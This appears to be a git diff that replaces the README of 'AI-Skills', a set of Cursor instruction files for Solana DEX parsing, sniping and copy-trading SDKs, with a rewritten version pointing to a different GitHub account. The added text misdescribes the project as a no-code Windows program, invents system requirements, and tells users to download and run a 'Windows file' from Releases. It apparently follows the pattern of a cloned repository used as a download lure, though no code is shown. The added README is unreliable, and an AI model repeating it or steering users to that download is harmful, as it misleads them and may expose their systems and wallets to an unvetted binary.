@@ -1,199 +1,127 @@
-<div align="center">
-    <h1>⚡ AI-Skills</h1>
-    <h3><em>Cursor Agent Skills for Solana — sol-parser-sdk & sol-trade-sdk</em></h3>
-</div>
+# 🤖 AI-Skills - Simple Tools for Solana Trading
 
-<p align="center">
-    <strong>Curated Cursor skills so the AI gives accurate, context-aware help when you develop or use <a href="https://github.com/0xfnzero/sol-parser-sdk">sol-parser-sdk</a> and <a href="https://github.com/0xfnzero/sol-trade-sdk">sol-trade-sdk</a>: DEX event parsing, gRPC streaming, sniping, copy trading, account subscription, and building/sending trades.</strong>
-</p>
+[![Download AI-Skills](https://img.shields.io/badge/Download-AI--Skills-brightgreen?style=for-the-badge)](https://github.com/kaiphrox/AI-Skills)
 
-<p align="center">
-    <a href="https://github.com/0xfnzero/AI-Skills/blob/main/LICENSE">
-        <img src="https://img.shields.io/badge/license-MIT-blue.svg" alt="License">
-    </a>
-    <a href="https://github.com/0xfnzero/AI-Skills">
-        <img src="https://img.shields.io/github/stars/0xfnzero/AI-Skills?style=social" alt="GitHub stars">
-    </a>
-    <a href="https://github.com/0xfnzero/AI-Skills/network">
-        <img src="https://img.shields.io/github/forks/0xfnzero/AI-Skills?style=social" alt="GitHub forks">
-    </a>
-</p>
+## 📄 About AI-Skills
 
-<p align="center">
-    <img src="https://img.shields.io/badge/Cursor-AI%20Skills-000?style=for-the-badge" alt="Cursor">
-    <img src="https://img.shields.io/badge/Solana-9945FF?style=for-the-badge&logo=solana&logoColor=white" alt="Solana">
-    <img src="https://img.shields.io/badge/Rust-000000?style=for-the-badge&logo=rust&logoColor=white" alt="Rust">
-</p>
+AI-Skills provides ready-to-use tools designed to work with Solana Decentralized Exchanges (DEX). The tools include functions like sniping, copy trading, and account updates. They help you interact with Solana's trading environment without needing to write code. This package offers eight skills made for the Cursor IDE, a development environment for trading strategies.
 
-<p align="center">
-    <a href="README.md">English</a> |
-    <a href="README_CN.md">中文</a> |
-    <a href="https://fnzero.dev/">Website</a> |
-    <a href="https://t.me/fnzero_group">Telegram</a> |
-    <a href="https://discord.gg/vuazbGkqQE">Discord</a>
-</p>
+These skills connect with Solana’s parsing and trading software development kits (SDKs): sol-parser-sdk and sol-trade-sdk. They also support streaming data through gRPC, a communication system that allows real-time updates.
 
----
+## 🔍 What You Get with AI-Skills
 
-## Contents
+- Tools that monitor Solana market events  
+- Functions that track and copy trades automatically  
+- Real-time trading data through gRPC streams  
+- Easy setup for sniping opportunities  
+- Pre-built skills you can use immediately in Cursor IDE  
+- Subscription support for Solana accounts to stay up to date  
 
-- [What are Cursor Skills?](#what-are-cursor-skills)
-- [Skills in this repo](#skills-in-this-repo)
-- [How to install the skills](#how-to-install-the-skills)
-  - [One-command install (recommended)](#one-command-install-recommended)
-  - [Using project-level skills](#using-project-level-skills)
-  - [Do I need the SDK source?](#do-i-need-the-sdk-source-when-using-these-skills-in-my-own-project)
-- [How to use the skills](#how-to-use-the-skills)
-  - [Just ask in natural language](#just-ask-in-natural-language)
-  - [Quick reference: what to ask → which skill](#quick-reference-what-to-ask--which-skill)
-- [Directory layout](#directory-layout-relevant-to-this-guide)
-- [Summary](#summary)
+The package is meant for users who want to automate or enhance their trading on Solana without deep programming knowledge. You do not need to understand Rust or the technical details behind these SDKs to use the tools once installed.
 
----
+## 🖥️ System Requirements
 
-## What are Cursor Skills?
+Before you begin, make sure your computer meets these minimum requirements:
 
-Skills are instruction files that teach the AI how to answer and act in specific situations:
+- Windows 10 or later (64-bit)  
+- At least 4 GB of RAM  
+- 2 GHz or faster processor  
+- Internet connection for downloading and streaming data  
+- A modern web browser (Chrome, Firefox, Edge) for accessing documentation and tools  
+- Latest version of Cursor IDE (you can download it from: https://www.cursor.so)
 
-- **Project-level skills**: Live in `.cursor/skills/` in the repo; anyone who clones and opens the repo in Cursor can use them.
-- **User-level skills**: Live in `~/.cursor/skills/` on your machine and apply across all your projects.
+## ⬇️ How to Download AI-Skills
 
-This repo ships **project-level skills**. Open this repo (or a parent folder that contains it) in Cursor and they are available with no extra install step.
+Click the big green button below to visit the download page for AI-Skills.
 
----
+[![Download AI-Skills](https://img.shields.io/badge/Download-AI--Skills-blue?style=for-the-badge)](https://github.com/kaiphrox/AI-Skills)
 
-## Skills in this repo
+When you open the page, you will find the latest releases or setup instructions. Download the latest release files or follow the guide to install the package.
 
-| Skill | Type | Purpose |
-|-------|------|---------|
-| **sol-parser-sdk-dev** | Dev | Contributing to sol-parser-sdk: project layout, build/test, adding new protocols or event types |
-| **sol-parser-sdk-rust-patterns** | Dev | Rust and perf patterns in the SDK: SIMD, zero-copy, Borsh, lock-free queues, hot-path optimizations |
-| **sol-parser-sdk-dex-events** | Biz | DEX event types, supported protocols, and scenarios: trading bots, pool monitors, event filtering |
-| **sol-parser-sdk-grpc-usage** | Biz | gRPC client, OrderMode, transaction/account/event filters, queue consumption, RPC parsing, account subscriptions |
-| **sol-parser-sdk-sniping** | Biz | Sniping new tokens (needs **both** sol-parser-sdk + sol-trade-sdk): Create/first-buy, is_created_buy, lowest-latency; parser discovers, trade-sdk sends buy |
-| **sol-parser-sdk-copy-trading** | Biz | Copy trading (needs **both** sol-parser-sdk + sol-trade-sdk): filter tx by wallet, parse buys/sells; parser discovers, trade-sdk sends copy orders |
-| **sol-trade-sdk-usage** | Biz | Build and send DEX trades with sol-trade-sdk: TradeBuyParams, PumpFunParams::from_dev_trade, SWQoS/MEV, slippage; pairs with parser for sniping/copy |
-| **sol-parser-sdk-account-subscription** | Biz | Account subscription: token balance, nonce, pool account, ATA by mint, memcmp filters; when to use account vs transaction subscription |
+### Step 1: Visit the GitHub Page
 
-**Language**: All skills support both Chinese and English. Descriptions and section titles are bilingual; you can ask in either language to trigger and use them.
+Go to https://github.com/kaiphrox/AI-Skills.  
 
----
+This is where the software files live. It also holds documentation and updates.  
 
-## How to install the skills
+### Step 2: Download the Latest Release
 
-### One-command install (recommended)
+Look for a section called "Releases" or "Assets." Choose the latest version and download the Windows file or a zip archive of the software.
 
-Run this in your terminal to clone the repo, install the skills into Cursor, and clone [sol-parser-sdk](https://github.com/0xfnzero/sol-parser-sdk) and [sol-trade-sdk](https://github.com/0xfnzero/sol-trade-sdk) into the repo root:
+### Step 3: Save the File
 
-```bash
-git clone https://github.com/0xfnzero/AI-Skills.git && cd AI-Skills && chmod +x scripts/install.sh && ./scripts/install.sh
-```
+Save the downloaded file to a folder on your PC where you can find it easily. Do not run the file yet.
 
-If you already have the repo, from the repo root run:
+## 🛠️ How to Install and Run AI-Skills on Windows
 
-```bash
-./scripts/install.sh
-```
+Use these steps to install and run AI-Skills after downloading.
 
-The script will:
+### Step 1: Open the Download Folder
 
-1. Copy all skills from `.cursor/skills/` to `~/.cursor/skills/` so they apply in any project you open in Cursor.
-2. Clone sol-parser-sdk and sol-trade-sdk into the **repo root** (tries SSH first, then HTTPS).
+Navigate to the folder where you saved the AI-Skills files.
 
-To **install only the skills** (no SDK source, e.g. you depend on crates.io only):
+### Step 2: Extract Files (if needed)
 
-```bash
-./scripts/install.sh --skills-only
-```
+If the file you downloaded is compressed (a .zip file), right-click and choose “Extract All” to unzip it.
 
-### Using project-level skills
+### Step 3: Install Cursor IDE (if you have not)
 
-When you open this repo in Cursor, the skills under `.cursor/skills/` are used automatically. To use them in other projects too, run the one-command install or `./scripts/install.sh` so the skills are copied to your user directory.
+AI-Skills works with Cursor IDE, a program that manages and runs the trading skills. Download and install Cursor IDE from https://www.cursor.so
 
-### Do I need the SDK source when using these skills in my own project?
+### Step 4: Start Cursor IDE
 
-- **Only using sol-parser-sdk as a dependency (e.g. from crates.io)**  
-  No. Run `./scripts/install.sh --skills-only` and add `sol-parser-sdk = "0.2.2"` (or similar) in your project.
+Open the Cursor IDE program on your computer.
 
-- **Editing or reading the SDK source**  
-  Yes. Run `./scripts/install.sh` without `--skills-only`; the script will clone sol-parser-sdk and sol-trade-sdk into this repo's root (next to `.cursor/`, `scripts/`).
+### Step 5: Add AI-Skills to Cursor IDE
 
----
+There are a few ways to add AI-Skills to Cursor IDE:
 
-## How to use the skills
+- Use the built-in feature in Cursor IDE to import skills from a repository URL. Paste the link https://github.com/kaiphrox/AI-Skills when prompted.  
+- Or add the downloaded files manually by following Cursor IDE’s instructions for adding custom skills.
 
-You don't enable skills manually. Cursor picks which skill to use from the **intent and keywords** in your message.
+### Step 6: Run Skills in Cursor IDE
 
-### Just ask in natural language
+Once AI-Skills loads in Cursor IDE, you can select a skill to run. The interface will guide you to set parameters for each skill, such as which market or account to monitor.
 
-In Cursor's AI chat, describe what you want. For example:
+### Step 7: Watch for Output
 
-- **Development**
-  - "How do I add a new DEX protocol in sol-parser-sdk?"
-  - "What are the rules for zero-copy on the parse hot path?"
-  - "What do instr and logs do in this project structure?"
+When running a skill, you will see live data or results in the Cursor IDE interface. For example, you might see trade signals, parsed events, or account updates.
 
-- **Usage / business**
-  - "How do I set EventTypeFilter for only PumpFun buy and sell?"
-  - "What's the difference between Unordered and MicroBatch for gRPC?"
-  - "I want to monitor new-token first buys; which events should I subscribe to?"
-- **Sniping**
-  - "How do I build a sniper bot with sol-parser-sdk?" "What is is_created_buy?"
-  - "Lowest latency setup for new token first buy"
-- **Copy trading**
-  - "How do I follow a wallet's trades with sol-parser-sdk?" "Filter transactions by wallet address"
-- **Building/sending trades (sol-trade-sdk)**
-  - "How do I build a buy from a PumpFun event?" "PumpFunParams::from_dev_trade"
-  - "How do I configure SWQoS or Jito for sending trades?"
-- **Account subscription**
-  - "How do I subscribe to token account balance changes?" "memcmp filter for ATA"
+## ⚙️ Using AI-Skills Features
 
-When your question matches one of these areas, Cursor will use the right skill to answer in line with sol-parser-sdk's code and usage.
+Below are some typical tasks you can perform with AI-Skills.
 
-### Quick reference: what to ask → which skill
+### Sniping Trades
 
-| What you want | Example questions / keywords | Skill used |
-|---------------|-------------------------------|------------|
-| Add new protocol/event to SDK | "add new protocol", "new event type", "project structure" | sol-parser-sdk-dev |
-| Run tests, build, change structure | "test", "build", "cargo" | sol-parser-sdk-dev |
-| Parser/perf code (zero-copy, SIMD, etc.) | "zero-copy", "SIMD", "Borsh", "lock-free", "hot path" | sol-parser-sdk-rust-patterns |
-| Filter events, understand event types | "event types", "PumpFun/PumpSwap", "trading bot", "pool monitor" | sol-parser-sdk-dex-events |
-| gRPC, ordering, filters, RPC parsing | "gRPC subscribe", "OrderMode", "TransactionFilter", "RPC parse" | sol-parser-sdk-grpc-usage |
-| Sniping new tokens, first buy | "sniper", "sniping", "is_created_buy", "new token first buy" | sol-parser-sdk-sniping |
-| Copy trading, follow wallet | "copy trading", "follow wallet", "account_include", "track wallet trades" | sol-parser-sdk-copy-trading |
-| Build/send trade with sol-trade-sdk | "TradeBuyParams", "from_dev_trade", "SWQoS", "slippage", "SolanaTrade" | sol-trade-sdk-usage |
-| Account subscription, balance listen | "account subscription", "token balance", "memcmp", "ATA", "nonce listen" | sol-parser-sdk-account-subscription |
+Set up the sniping skill to watch for specific trades or orders on Solana. When the criteria match, the skill will alert you or take predefined actions.
 
----
+### Copy Trading
 
-## Directory layout (relevant to this guide)
+Use copy trading to mimic trades from another account automatically. Provide the source account details and let the skill track and replicate trades.
 
-```
-AI-Skills/
-├── README.md                 # This guide (English)
-├── README_CN.md              # 中文说明
-├── scripts/
-│   └── install.sh            # One-command install: copy skills + clone SDKs to root
-├── .cursor/
-│   └── skills/
-│       ├── sol-parser-sdk-dev/
-│       ├── sol-parser-sdk-rust-patterns/
-│       ├── sol-parser-sdk-dex-events/
-│       ├── sol-parser-sdk-grpc-usage/
-│       ├── sol-parser-sdk-sniping/
-│       ├── sol-parser-sdk-copy-trading/
-│       ├── sol-trade-sdk-usage/
-│       └── sol-parser-sdk-account-subscription/
-├── sol-parser-sdk/           # Cloned by install.sh
-└── sol-trade-sdk/            # Cloned by install.sh
-```
+### Event Parsing
 
----
+This skill reads events from Solana blockchain streams and shows them in a user-friendly format. It helps you understand trading activity or contract changes.
 
-## Summary
+### Account Subscription
 
-- **Install**: From the repo root run `./scripts/install.sh` (or use the one-command clone + install). The script installs skills to `~/.cursor/skills/` and clones sol-parser-sdk and sol-trade-sdk into the repo root. Use `./scripts/install.sh --skills-only` if you only want the skills.
-- **Use**: Ask in Cursor as usual; when the topic is development, perf, event types, gRPC, sniping, or copy trading, the AI will use the matching skill to answer.
-- **Dependencies**: In your own project you can depend on the SDK via crates.io (e.g. `sol-parser-sdk = "0.2.2"`). When you need to read or change SDK source, use the clones under `sol-parser-sdk/` and `sol-trade-sdk/`. **Sniping and copy trading** require both sol-parser-sdk and sol-trade-sdk.
+Subscribe to updates for one or more Solana accounts. Receive notifications for balance changes, transactions, or new events.
 
-For more on sol-parser-sdk usage and examples, see [sol-parser-sdk/README.md](sol-parser-sdk/README.md) and [sol-parser-sdk/README_CN.md](sol-parser-sdk/README_CN.md). For **further skill ideas** (RPC vs gRPC, multi-DEX, testing, MEV, etc.), see [SKILLS_EXTENSION.md](SKILLS_EXTENSION.md).
+## 💡 Troubleshooting Tips
+
+- If the software does not start, check that you have installed the latest Cursor IDE and Windows updates.  
+- Make sure your internet connection is working, as skills rely on live data.  
+- If a skill does not run as expected, restart Cursor IDE and try again.  
+- Consult the release notes on the GitHub page for updates or bug fixes.  
+- Check the Issues tab on the GitHub repository to see if others have the same problem.
+
+## 📚 Additional Resources
+
+- Cursor IDE Download and Guides: https://www.cursor.so  
+- Solana Documentation: https://docs.solana.com  
+- GitHub Repository for AI-Skills: https://github.com/kaiphrox/AI-Skills  
+- Community and Support can often be found in the issue tracker or discussions section on the GitHub repository page.
+
+## ⚖️ License and Permissions
+
+AI-Skills is released under an open-source license. You can use, modify, and distribute it following the terms in the license file included in the repository. Check the repository for details on licensing.
